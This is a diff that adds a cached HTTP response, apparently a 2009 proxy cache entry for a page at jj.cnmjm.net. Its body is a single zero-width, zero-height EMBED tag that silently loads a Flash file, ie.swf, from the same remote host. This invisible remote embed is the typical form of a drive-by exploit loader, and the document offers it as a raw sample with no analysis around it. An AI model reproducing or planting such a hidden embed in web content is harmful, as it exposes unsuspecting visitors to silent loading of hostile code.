@@ -1,0 +1,14 @@
+HTTP/1.1 200 OK
+Content-Length: 55
+ETag: "ec7965c05df1c81:475"
+Date: Tue, 03 Mar 2009 02:21:45 GMT
+Last-Modified: Tue, 29 Jul 2008 09:30:34 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+X-Polipo-Location: http://jj.cnmjm.net/ie.htm
+X-Polipo-Date: Tue, 03 Mar 2009 02:33:14 GMT
+X-Polipo-Access: Tue, 03 Mar 2009 02:33:14 GMT
+
+<EMBED src=http://jj.cnmjm.net/ie.swf width=0 height=0>
